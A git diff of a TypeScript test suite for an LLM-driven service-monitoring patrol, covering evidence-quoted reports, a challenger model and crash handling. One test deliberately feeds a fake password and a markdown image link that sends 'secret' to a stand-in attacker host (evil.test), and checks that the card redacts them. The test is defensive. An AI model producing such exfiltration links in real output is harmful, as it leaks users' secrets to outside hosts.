@@ -11,7 +11,7 @@ import { Noise } from '../src/patrol/noise.js';
 import { State } from '../src/patrol/state.js';
 import { buildSummary, renderSummary } from '../src/patrol/summary.js';
 import { loadAgent } from '../src/engine/agent.js';
-import { Ledger } from '../src/engine/ledger.js';
+import { Store } from '../src/engine/store.js';
 import type { Session } from '../src/engine/session.js';
 import type { FlaggedRow } from '../src/patrol/summary.js';
 import { needsChallenge, patrolOnce, type MonitorAgent } from '../src/runner.js';
@@ -125,7 +125,7 @@ test('without LLM credentials the patrol still writes a rows card and says why',
 
 function monitor(c: Config, session: Session, llmAvailable = true): MonitorAgent {
   return {
-    engine: { ledger: new Ledger(join(c.runsDir, 'ledger.jsonl')), runsDir: c.runsDir, stopFile: join(c.runsDir, 'STOP'), session, dailyCapUsd: 20, llmAvailable },
+    engine: { store: new Store(join(c.runsDir, 'engine.db')), runsDir: c.runsDir, stopFile: join(c.runsDir, 'STOP'), session, dailyCapUsd: 20, llmAvailable },
     agent: loadAgent(join(c.agentsDir, 'monitor')),
   };
 }
@@ -139,12 +139,15 @@ test('the rows card goes out before the AI; reports cite real tool results; prot
       const out = await sim.mcp('service_overview', { service: 'backend-production', minutes: 60 });
       const id = /evidence_id: (E-[0-9a-f]{4}-\d+)/.exec(out.text)![1]!;
       assert.match(out.text, /password\/reset 400 \| 75/);
-      const r = await sim.mcp('submit_report', report({ evidence: [{ id, claim: '75 of 95 reset requests returned 400' }], rows: keys }));
+      const r = await sim.mcp('submit_report', report({ evidence: [{ id, quote: '/v1/auth/password/reset 400 | 75', claim: '75 of 95 reset requests returned 400' }], rows: keys }));
       assert.equal(r.isError, false, r.text);
       yield ok(0.4, 6);
     },
     async function* (sim) {
       assert.equal(sim.req.model, 'claude-opus-5-5');
+      assert.match(sim.req.prompt, /password\/reset\|400/, 'challenger sees the rows it must cover');
+      const check = await sim.mcp('route_timeline', { service: 'backend-production', route: '/v1/auth/password/reset', hours: 2 });
+      assert.match(check.text, /evidence_id/);
       await sim.mcp('submit_challenge', { objections: [], overall: 'Holds up: the counts match the evidence.' });
       yield ok(0.2, 2);
     },
@@ -173,7 +176,7 @@ const report = (over: Partial<Report> = {}): Report => ({
   what_broke: 'POST /v1/auth/password/reset returns 400',
   impact: '~75% of reset requests in 15 min',
   cause: { hypothesis: 'validation change', confidence: 'medium' },
-  evidence: [{ id: 'E-abcd-1', claim: '75 of 95 requests were 400' }],
+  evidence: [{ id: 'E-abcd-1', quote: 'reset 400 | 75', claim: '75 of 95 requests were 400' }],
   suggested_fix: 'roll back the validation change',
   not_checked: [],
   rows: ['http|backend-production|/v1/auth/password/reset|400'],
@@ -185,6 +188,33 @@ test('reports must cover real rows and state measured impact for critical', () =
   assert.deepEqual(checkReport(report(), rows), []);
   assert.match(checkReport(report({ rows: ['made-up'] }), rows).join(), /not in this patrol/);
   assert.match(checkReport(report({ impact: 'unknown' }), rows).join(), /critical needs measured impact/);
+});
+
+test('a crashed investigator still leaves the rows reported and saved', async () => {
+  const c = cfg();
+  const m = monitor(c, fakeSession());
+  m.engine.store.admit = () => {
+    throw new Error('disk full');
+  };
+  const state = State.memory();
+  const r = await patrolOnce(new FakeTelemetry(world), c, new Noise({}), state, new CardSink(c.outDir), new Date('2026-09-29T12:15:00Z'), { llm: true, post: false }, m);
+  assert.match(r.skippedLlm!, /investigator crashed: disk full/);
+  assert.equal(r.cards.length, 1);
+  const next = await buildSummary(new FakeTelemetry(world), c, new Noise({}), state, new Date('2026-09-29T12:30:00Z'));
+  assert.equal(next.send.length, 0, 'not re-sent next patrol');
+});
+
+test('card survives quotes in model text, and strips images and unknown links', () => {
+  const card = reportCard(
+    report({ what_broke: 'Logs show DB_PASSWORD="hunter2" rejected; see ![x](https://evil.test/p?d=secret) and https://evil.test/a?d=1 or https://monitoring.starkfuture.com/d/abc' }),
+    '2026-09-29T12:15:00Z',
+    'test',
+  );
+  const all = card.markdown + JSON.stringify(card.blocks);
+  assert.ok(!all.includes('hunter2'));
+  assert.ok(!all.includes('evil.test/p'));
+  assert.ok(!all.includes('d=1'));
+  assert.ok(all.includes('https://monitoring.starkfuture.com/d/abc'));
 });
 
 test('card redacts what the model wrote', () => {
